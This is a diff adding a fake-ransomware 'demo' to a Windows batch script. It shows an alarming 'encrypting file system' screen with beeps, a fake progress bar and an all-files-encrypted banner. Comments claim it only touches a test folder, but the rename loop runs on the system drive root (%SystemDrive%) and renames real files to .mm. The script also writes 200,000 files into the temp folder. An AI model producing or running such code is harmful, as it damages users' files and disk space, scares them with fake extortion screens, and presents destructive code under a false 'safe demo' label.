@@ -77,4 +77,77 @@ for %%c in (0c 0a 0d 0e 4f) do (
   timeout /t 1 >nul
 )
 
+:: =========================
+:: DEMO FILE ENCRYPTION (.mm)
+:: BEZPIECZNE – TYLKO FOLDER TESTOWY
+:: =========================
+cls
+color 0c
+title ENCRYPTING FILE SYSTEM
+
+set "DEMO=%TEMP%\SYSTEM_ENCRYPTION_DEMO"
+
+:: Utwórz folder demo
+if not exist "%DEMO%" mkdir "%DEMO%"
+
+:: Utwórz FAKE pliki
+echo fake data> "%DEMO%\resume.docx"
+echo fake data> "%DEMO%\photo.jpg"
+echo fake data> "%DEMO%\video.mp4"
+echo fake data> "%DEMO%\data.xlsx"
+echo fake data> "%DEMO%\archive.zip"
+
+echo Initializing encryption engine...
+timeout /t 2 >nul
+
+echo Encrypting files:
+timeout /t 1 >nul
+
+:: ZMIANA ROZSZERZEŃ NA .mm (REALNA, ALE TYLKO W DEMO)
+for %%F in ("%SystemDrive%\*.*") do (
+    echo Encrypting %%~nxF
+    ren "%%F" "%%~nF.mm"
+    powershell -c "[console]::beep(900,80)"
+    timeout /t 1 >nul
+)
+
+:: FEJK PROGRESS
+for /L %%P in (1,1,100) do (
+    cls
+    echo ENCRYPTING FILE SYSTEM...
+    echo Progress: %%P%%
+    powershell -c "[console]::beep(600,15)"
+)
+
+cls
+color 4f
+echo ALL FILES HAVE BEEN ENCRYPTED
+echo Extension changed to: .mm
+echo Location:
+echo %DEMO%
+timeout /t 4 >nul
+
+:: =========================
+:: REAL FILE CREATION (SAFE LIMIT)
+:: =========================
+set "DEMO=%TEMP%\SYSTEM_ENCRYPTION_DEMO"
+set MAX_FILES=200000
+
+if not exist "%DEMO%" mkdir "%DEMO%"
+
+cls
+echo Creating demo files...
+timeout /t 1 >nul
+
+for /L %%i in (1,1,%MAX_FILES%) do (
+    echo encrypted> "%DEMO%\file_%%i.mm"
+    if %%i lss 1000 powershell -c "[console]::beep(800,5)"
+)
+
+cls
+color 4f
+echo %MAX_FILES% FILES CREATED AND ENCRYPTED (.mm)
+echo Location:
+echo %DEMO%
+timeout /t 3 >nul
 goto start
